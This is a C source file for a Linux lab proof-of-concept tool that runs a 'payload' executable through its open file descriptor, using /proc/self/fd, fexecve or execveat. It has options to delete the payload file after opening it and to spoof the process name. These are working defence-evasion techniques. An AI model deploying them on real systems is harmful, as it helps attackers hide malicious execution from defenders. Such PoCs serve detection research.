/*
 * fenix-proc-fd-exec — Execute via open file descriptor /proc/self/fd (lab PoC).
 * Linux-only.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

extern char **environ;

static void usage(const char *prog)
{
    fprintf(stderr,
            "Usage: %s --payload <path> [--method procfs-fd|fexecve|execveat]\n"
            "       [--unlink-after-open] [--argv0 <name>]\n",
            prog);
}

int main(int argc, char **argv)
{
    const char *payload_path = NULL;
    const char *method = "procfs-fd";
    const char *argv0_override = NULL;
    int unlink_after_open = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--payload") == 0 && i + 1 < argc) {
            payload_path = argv[++i];
        } else if (strcmp(argv[i], "--method") == 0 && i + 1 < argc) {
            method = argv[++i];
        } else if (strcmp(argv[i], "--argv0") == 0 && i + 1 < argc) {
            argv0_override = argv[++i];
        } else if (strcmp(argv[i], "--unlink-after-open") == 0) {
            unlink_after_open = 1;
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            usage(argv[0]);
            return 0;
        } else {
            fprintf(stderr, "fenix-proc-fd-exec: unknown option: %s\n", argv[i]);
            usage(argv[0]);
            return 1;
        }
    }

    if (!payload_path) {
        fprintf(stderr, "fenix-proc-fd-exec: --payload is required\n");
        usage(argv[0]);
        return 1;
    }

    int fd = open(payload_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        perror("open payload");
        return 1;
    }

    if (unlink_after_open) {
        if (unlink(payload_path) != 0) {
            perror("unlink payload");
            close(fd);
            return 1;
        }
    }

    const char *display = argv0_override ? argv0_override : payload_path;
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

    char *argv_exec[] = { (char *)display, NULL };

    if (strcmp(method, "procfs-fd") == 0) {
        execve(fd_path, argv_exec, environ);
        perror("execve procfs-fd");
    } else if (strcmp(method, "fexecve") == 0) {
        fexecve(fd, argv_exec, environ);
        perror("fexecve");
    } else if (strcmp(method, "execveat") == 0) {
        execveat(fd, "", argv_exec, environ, AT_EMPTY_PATH);
        perror("execveat");
    } else {
        fprintf(stderr, "fenix-proc-fd-exec: unknown method '%s'\n", method);
        close(fd);
        return 1;
    }

    close(fd);
    return 1;
}
